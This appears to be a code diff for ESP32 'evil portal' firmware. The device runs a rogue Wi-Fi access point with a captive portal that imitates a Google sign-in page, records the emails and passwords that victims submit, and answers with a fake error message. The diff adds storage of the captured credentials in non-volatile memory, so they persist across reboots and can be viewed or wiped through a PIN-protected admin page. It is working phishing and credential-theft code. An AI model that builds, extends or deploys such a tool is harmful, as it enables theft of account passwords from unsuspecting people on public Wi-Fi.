@@ -2,12 +2,13 @@
 #include <ESPAsyncWebServer.h>
 #include <DNSServer.h>
 #include <vector>
+#include <Preferences.h> // Added for Non-Volatile Storage
 
 const char *ssid = "((TEST))";
 const char *password = "";
 const byte DNS_PORT = 53;
 IPAddress apIP(8, 8, 8, 8);
-const char *adminPin = "admin"; // Admin PIN code added here
+const char *adminPin = "admin"; 
 
 DNSServer dnsServer;
 AsyncWebServer server(80);
@@ -19,6 +20,46 @@ struct LoginData {
 
 std::vector<LoginData> logins;
 unsigned long startTime;
+Preferences preferences; // NVS instance
+
+// --- NVS Helper Functions ---
+void loadLogins() {
+  preferences.begin("evil_portal", true); // true = read-only mode
+  String savedData = preferences.getString("creds", "");
+  preferences.end();
+  
+  if (savedData.length() > 0) {
+    int startIndex = 0;
+    int endIndex = savedData.indexOf("###");
+    while (endIndex != -1) {
+      String entry = savedData.substring(startIndex, endIndex);
+      int sepIndex = entry.indexOf("|||");
+      if (sepIndex != -1) {
+        logins.push_back({ entry.substring(0, sepIndex), entry.substring(sepIndex + 3) });
+      }
+      startIndex = endIndex + 3;
+      endIndex = savedData.indexOf("###", startIndex);
+    }
+  }
+}
+
+void saveLogins() {
+  preferences.begin("evil_portal", false); // false = read-write mode
+  String dataToSave = "";
+  for (size_t i = 0; i < logins.size(); i++) {
+    dataToSave += logins[i].email + "|||" + logins[i].password + "###";
+  }
+  preferences.putString("creds", dataToSave);
+  preferences.end();
+}
+
+void clearLogins() {
+  logins.clear();
+  preferences.begin("evil_portal", false);
+  preferences.remove("creds");
+  preferences.end();
+}
+// ----------------------------
 
 // Google Login-Site with SVG Logo
 const char* loginPage = R"rawliteral(
@@ -28,97 +69,23 @@ const char* loginPage = R"rawliteral(
   <title>Google Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: 'Roboto', Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-color: #ffffff;
-    }
-    .login-container {
-      width: 450px;
-      max-width: 90%;
-      padding: 48px 40px 36px;
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      text-align: center;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    }
-    .google-logo {
-      height: 40px;
-      margin-bottom: 16px;
-    }
-    h1 {
-      color: #202124;
-      font-size: 24px;
-      font-weight: 400;
-      margin-bottom: 10px;
-    }
-    .subtitle {
-      color: #202124;
-      font-size: 16px;
-      font-weight: 400;
-      margin-bottom: 32px;
-    }
-    .form-group {
-      margin-bottom: 24px;
-      text-align: left;
-    }
-    .form-control {
-      position: relative;
-      height: 56px;
-      width: calc(100% - 24px);
-      padding: 12px;
-      font-size: 16px;
-      color: #202124;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      outline: none;
-      transition: border-color 0.2s;
-    }
-    .form-control:focus {
-      border-color: #1a73e8;
-      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
-    }
-    .btn {
-      display: inline-block;
-      background-color: #1a73e8;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 500;
-      padding: 10px 24px;
-      cursor: pointer;
-      text-transform: none;
-      letter-spacing: .25px;
-      transition: background-color 0.2s;
-    }
-    .btn:hover {
-      background-color: #287ae6;
-    }
-    .footer {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 32px;
-    }
-    .footer a {
-      color: #1a73e8;
-      text-decoration: none;
-      font-weight: 500;
-      font-size: 14px;
-    }
-    form {
-      width: 100%;
-    }
+    body { font-family: 'Roboto', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #ffffff; }
+    .login-container { width: 450px; max-width: 90%; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .google-logo { height: 40px; margin-bottom: 16px; }
+    h1 { color: #202124; font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+    .subtitle { color: #202124; font-size: 16px; font-weight: 400; margin-bottom: 32px; }
+    .form-group { margin-bottom: 24px; text-align: left; }
+    .form-control { position: relative; height: 56px; width: calc(100% - 24px); padding: 12px; font-size: 16px; color: #202124; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border-color 0.2s; }
+    .form-control:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2); }
+    .btn { display: inline-block; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; padding: 10px 24px; cursor: pointer; text-transform: none; letter-spacing: .25px; transition: background-color 0.2s; }
+    .btn:hover { background-color: #287ae6; }
+    .footer { display: flex; justify-content: space-between; margin-top: 32px; }
+    .footer a { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
+    form { width: 100%; }
   </style>
 </head>
 <body>
   <div class="login-container">
-    <!-- SVG Google Logo -->
     <svg class="google-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
       <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
       <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
@@ -150,7 +117,7 @@ const char* loginPage = R"rawliteral(
 const char* adminLoginPage = R"rawliteral(
 <!DOCTYPE html>
 <html>
-<head>  n 
+<head>
   <title>Admin Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
@@ -244,6 +211,9 @@ public:
 void setup() {
   Serial.begin(115200);
   
+  // 1. Load previously saved credentials from NVS before starting services
+  loadLogins();
+  
   // Set IP for AP
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
@@ -258,62 +228,64 @@ void setup() {
   startTime = millis();
 
   // Captive Portal Detection Endpoints
-  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
+  server.on("/generate_204", HTTP_GET, [] (AsyncWebServerRequest *request) {
     request->redirect("http://" + WiFi.softAPIP().toString());
   });
   
-  server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){
+  server.on("/fwlink", HTTP_GET, [] (AsyncWebServerRequest *request) {
     request->redirect("http://" + WiFi.softAPIP().toString());
   });
   
-  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request){
+  server.on("/connecttest.txt", HTTP_GET, [] (AsyncWebServerRequest *request) {
     request->redirect("http://" + WiFi.softAPIP().toString());
   });
   
-  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){
+  server.on("/hotspot-detect.html", HTTP_GET, [] (AsyncWebServerRequest *request) {
     request->redirect("http://" + WiFi.softAPIP().toString());
   });
   
-  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request){
+  server.on("/library/test/success.html", HTTP_GET, [] (AsyncWebServerRequest *request) {
     request->redirect("http://" + WiFi.softAPIP().toString());
   });
   
-  server.on("/favicon.ico", HTTP_GET, [](AsyncWebServerRequest *request){
+  server.on("/favicon.ico", HTTP_GET, [] (AsyncWebServerRequest *request) {
     request->send(200, "image/x-icon", "");
   });
 
-  // Standard Endpunkte
-  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+  // Standard Endpoints
+  server.on("/", HTTP_GET, [] (AsyncWebServerRequest *request) {
     request->send(200, "text/html", loginPage);
   });
 
-  // Form submission handler - modified to catch POST on root path
-  server.on("/", HTTP_POST, [](AsyncWebServerRequest *request){
+  // Form submission handler
+  server.on("/", HTTP_POST, [] (AsyncWebServerRequest *request) {
     if (request->hasParam("user", true) && request->hasParam("pass", true)) {
       String email = request->getParam("user", true)->value();
       String password = request->getParam("pass", true)->value();
       logins.push_back({ email, password });
+      
+      // 2. Save to NVS immediately after a new login
+      saveLogins(); 
+      
       Serial.printf("💀 Login: %s / %s\n", email.c_str(), password.c_str());
     }
     request->send(200, "text/html", "<h3>Error logging in. Please try again later.</h3>");
   });
 
   // Admin login page
-  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request){
+  server.on("/admin", HTTP_GET, [] (AsyncWebServerRequest *request) {
     String html = String(adminLoginPage);
     html.replace("%ERROR_MESSAGE%", "");
     request->send(200, "text/html", html);
   });
 
   // Admin PIN verification
-  server.on("/admin-verify", HTTP_POST, [](AsyncWebServerRequest *request){
+  server.on("/admin-verify", HTTP_POST, [] (AsyncWebServerRequest *request) {
     if (request->hasParam("pin", true)) {
       String pin = request->getParam("pin", true)->value();
       if (pin == adminPin) {
-        // PIN is correct, redirect to admin dashboard
         request->send(200, "text/html", buildAdminPage());
       } else {
-        // PIN is incorrect, show error
         String html = String(adminLoginPage);
         html.replace("%ERROR_MESSAGE%", "<div class='error'>Incorrect PIN! Please try again.</div>");
         request->send(200, "text/html", html);
@@ -323,9 +295,10 @@ void setup() {
     }
   });
 
-  server.on("/clear", HTTP_POST, [](AsyncWebServerRequest *request){
-    // Check if we're coming from admin page (this is basic and can be bypassed)
-    logins.clear();
+  // Clear logs handler
+  server.on("/clear", HTTP_POST, [] (AsyncWebServerRequest *request) {
+    // 3. Clear both RAM and NVS storage
+    clearLogins();
     request->redirect("/admin");
   });
 
